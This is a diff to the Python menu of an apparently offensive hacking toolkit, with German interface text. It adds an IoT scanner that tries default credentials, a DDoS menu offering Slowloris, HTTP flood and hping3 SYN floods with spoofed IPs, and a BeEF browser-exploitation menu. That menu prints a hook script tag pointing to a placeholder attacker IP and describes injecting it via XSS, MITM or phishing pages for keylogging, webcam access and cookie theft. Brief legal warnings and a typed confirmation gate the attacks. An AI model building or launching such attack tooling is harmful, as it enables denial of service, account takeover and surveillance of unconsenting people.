@@ -208,12 +208,14 @@ async def menu_network():
 
     while True:
         banner()
-        section("🌐  NETWORK INTELLIGENCE")
-        menu_item("1", "Quick Host Discovery",    "🟡")
-        menu_item("2", "Full Scan + Attack Chain","🟠")
-        menu_item("3", "Stealth Scan",            "🟠")
-        menu_item("4", "Export Last Scan (JSON)", "🟢")
-        menu_item("0", "Back")
+        section("🌐  NETWORK INTELLIGENCE", "Scan · Topology · CVE · IoT · DDoS")
+        menu_item(" 1", "🔍  Quick Host Discovery",    "🟡", "Aktive Hosts im Netzwerk finden")
+        menu_item(" 2", "🗺️   Full Scan + Attack Chain","🟠", "Ports + Services + CVEs + Exploit-Vorschläge")
+        menu_item(" 3", "🕵️   Stealth Scan",            "🟠", "SYN-Scan, langsam, weniger auffällig")
+        menu_item(" 4", "💾  Export letzten Scan",     "🟢", "JSON-Export der Scan-Ergebnisse")
+        menu_item(" 5", "📡  IoT Scanner",             "🔴", "Router/Kameras/NAS finden + Default-Creds testen")
+        menu_item(" 6", "💥  DDoS / Stress-Test",      "⛔", "Slowloris, HTTP Flood, hping3 SYN-Flood")
+        menu_item(" 0", "← Zurück", "")
 
         choice = prompt("network")
         if choice == "0":
@@ -245,6 +247,100 @@ async def menu_network():
             else:
                 print(f"\n{Y}[!] No scan data. Run a scan first.{R}")
 
+        elif choice == "5":
+            banner()
+            section("📡  IOT SCANNER", "Router · Kameras · NAS · Smart Home")
+            info_box([
+                "Scannt nach IoT-Geräten im Netzwerk:",
+                "  → Erkennt Hersteller + Modell automatisch",
+                "  → Testet 60+ Default-Credential-Kombinationen",
+                "  → Prüft HTTP Basic Auth + Form-Login + Telnet",
+                "",
+                "Beispiele für target:",
+                "  192.168.1.0/24   — komplettes Heimnetz",
+                "  192.168.1.1      — einzelner Router",
+                "  10.0.0.0/24      — anderes Subnetz",
+            ])
+            print()
+            target = ask("Ziel (IP oder CIDR)", "192.168.1.0/24")
+            if not target:
+                wait_key(); continue
+            print(f"\n  {RD}🔴  Nur im eigenen / autorisierten Netzwerk!{R}\n")
+            try:
+                from tools.network.iot_scanner import IoTScanner
+                scanner_iot = IoTScanner(target)
+                await run_tool_live(scanner_iot.scan())
+            except Exception as e:
+                print(f"  {RD}[!] {e}{R}")
+
+        elif choice == "6":
+            banner()
+            section("💥  DDOS / STRESS-TEST", "Nur eigene / autorisierte Server!")
+            info_box([
+                "⛔  WARNUNG: DDoS-Angriffe auf fremde Server sind in Deutschland strafbar (§303b StGB).",
+                "    Nur für: eigene Server-Tests, autorisierte Pentests, Lernzwecke im eigenen Netz.",
+            ])
+            print()
+            menu_item(" 1", "🐌  Slowloris",      "⛔", "Hält HTTP-Verbindungen offen → Server-Threads erschöpft")
+            menu_item(" 2", "🌊  HTTP Flood",      "⛔", "Asyncio GET-Flood → maximale Requests/sec")
+            menu_item(" 3", "💀  hping3 SYN-Flood","⛔", "Kernel-level SYN-Flood mit gefälschten IPs")
+            menu_item(" 0", "← Zurück", "")
+            print()
+            dchoice = prompt("ddos")
+
+            if dchoice == "0":
+                wait_key(); continue
+
+            host = ask("Ziel-Host / IP", required=True)
+            try:
+                port = int(ask("Port", "80"))
+            except ValueError:
+                port = 80
+            try:
+                duration = int(ask("Dauer in Sekunden", "60"))
+            except ValueError:
+                duration = 60
+
+            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+                print(f"  {Y}[!] Abgebrochen.{R}")
+                wait_key(); continue
+
+            print()
+            try:
+                if dchoice == "1":
+                    from tools.network.ddos import Slowloris
+                    try:
+                        socks = int(ask("Anzahl Sockets", "200"))
+                    except ValueError:
+                        socks = 200
+                    use_https = ask("HTTPS? [j/n]", "n").lower() in ("j", "y")
+                    sl = Slowloris(host, port, socks, duration=duration, use_https=use_https)
+                    await run_tool_live(sl.run())
+
+                elif dchoice == "2":
+                    from tools.network.ddos import HTTPFlood
+                    proto = "https" if port in (443, 8443) else "http"
+                    url   = ask("Ziel-URL", f"{proto}://{host}:{port}/")
+                    try:
+                        workers = int(ask("Worker-Anzahl (parallele Requests)", "100"))
+                    except ValueError:
+                        workers = 100
+                    hf = HTTPFlood(url, workers=workers, duration=duration)
+                    await run_tool_live(hf.run())
+
+                elif dchoice == "3":
+                    from tools.network.ddos import HpingFlood
+                    mode = ask("Modus [syn/udp/icmp/ack]", "syn")
+                    spoof = ask("Zufällige Quell-IP (Spoofing)? [j/n]", "j").lower() in ("j", "y")
+                    hpf = HpingFlood(host, port, mode, duration, spoof_src=spoof)
+                    await run_tool_live(hpf.run())
+
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+            except Exception as e:
+                print(f"  {RD}[!] {e}{R}")
+
         wait_key()
 
 
@@ -255,19 +351,21 @@ async def menu_web():
 
     while True:
         banner()
-        section("💻  WEB ATTACK")
-        menu_item("1", "Fingerprint Target",          "🟡")
-        menu_item("2", "Directory Fuzzer (ffuf)",     "🟠")
-        menu_item("3", "SQL Injection (sqlmap)",      "🟠")
-        menu_item("4", "Vuln Scan (nikto + nuclei)",  "🟠")
-        menu_item("5", "Full Auto Chain (all above)", "🟠")
-        menu_item("0", "Back")
+        section("💻  WEB ATTACK", "Recon · Fuzzing · SQLi · XSS · Browser Exploitation")
+        menu_item(" 1", "🔍  Fingerprint Target",          "🟡", "CMS, WAF, Server, Technologien erkennen")
+        menu_item(" 2", "📂  Directory Fuzzer (ffuf)",     "🟠", "Versteckte Pfade, Admin-Panels, Backups")
+        menu_item(" 3", "💉  SQL Injection (sqlmap)",      "🟠", "Auto-SQLi Erkennung + Datenbank-Dump")
+        menu_item(" 4", "🔬  Vuln Scan (nikto + nuclei)",  "🟠", "Bekannte CVEs, Fehlkonfigurationen")
+        menu_item(" 5", "🔗  Full Auto Chain",             "🟠", "Fingerprint → Fuzz → SQLi → Vuln Scan")
+        menu_item(" 6", "🪝  BeEF Browser Exploitation",   "⛔", "Browser hooken, Keylogger, Screenshot, Webcam")
+        menu_item(" 0", "← Zurück", "")
 
         choice = prompt("web")
         if choice == "0":
             return
 
         clr()
+
         if choice in ("1","2","3","4","5"):
             url = ask("Target URL (https://...)", required=True)
 
@@ -314,6 +412,58 @@ async def menu_web():
                 await run_tool_live(sc.nuclei_scan(url))
             except KeyboardInterrupt:
                 pass
+
+        elif choice == "6":
+            banner()
+            section("🪝  BEEF BROWSER EXPLOITATION", "Browser hooken via JavaScript")
+            info_box([
+                "BeEF hookt Browser über eine einzige JS-Zeile:",
+                "  <script src='http://<KALI-IP>:3000/hook.js'></script>",
+                "",
+                "Wege zum Einschleusen:",
+                "  A) XSS: in Kommentar/Suchfeld/URL-Parameter einbetten",
+                "  B) MITM: bettercap injiziert Hook automatisch (Tools → MITM)",
+                "  C) Phishing-Seite: in HTML der Fake-Login-Page einbauen",
+                "",
+                "Nach dem Hooking: vollständige Browser-Kontrolle.",
+            ])
+            print()
+            menu_item(" 1", "▶  BeEF starten",              "🔴", "Startet beef-xss im Hintergrund")
+            menu_item(" 2", "📋  Hook-Payloads anzeigen",   "🟡", "XSS-Payload, Script-Tag, MITM-Befehl")
+            menu_item(" 3", "🖥️   Gehookte Browser anzeigen","🟡", "Wer ist gerade gehookt + Browser-Info")
+            menu_item(" 4", "💻  Befehl ausführen",         "⛔", "Keylogger, Screenshot, Webcam, Cookies...")
+            menu_item(" 0", "← Web-Menü", "")
+            print()
+            bchoice = prompt("beef")
+
+            if bchoice == "1":
+                from tools.web.beef_engine import BeEFEngine
+                await run_tool_live(BeEFEngine().start_beef())
+
+            elif bchoice == "2":
+                kali_ip = ask("Deine Kali IP", "192.168.1.10")
+                from tools.web.beef_engine import BeEFEngine
+                await run_tool_live(BeEFEngine().get_hook_payloads(kali_ip))
+
+            elif bchoice == "3":
+                from tools.web.beef_engine import BeEFEngine
+                await run_tool_live(BeEFEngine().list_hooked_browsers())
+
+            elif bchoice == "4":
+                from tools.web.beef_engine import BeEFEngine, COMMANDS
+                session_id = ask("Session-ID (aus Option 3)")
+                if not session_id:
+                    wait_key(); continue
+                print()
+                for i, (key, info) in enumerate(COMMANDS.items(), 1):
+                    print(f"  {DIM}[{i:>2}]{R}  {G}{info['label']}{R}")
+                print()
+                cmd_num = ask("Nummer")
+                try:
+                    cmd_key = list(COMMANDS.keys())[int(cmd_num) - 1]
+                    await run_tool_live(BeEFEngine().run_command(session_id, cmd_key))
+                except (ValueError, IndexError):
+                    print(f"  {Y}[!] Ungültige Auswahl{R}")
 
         wait_key()
 
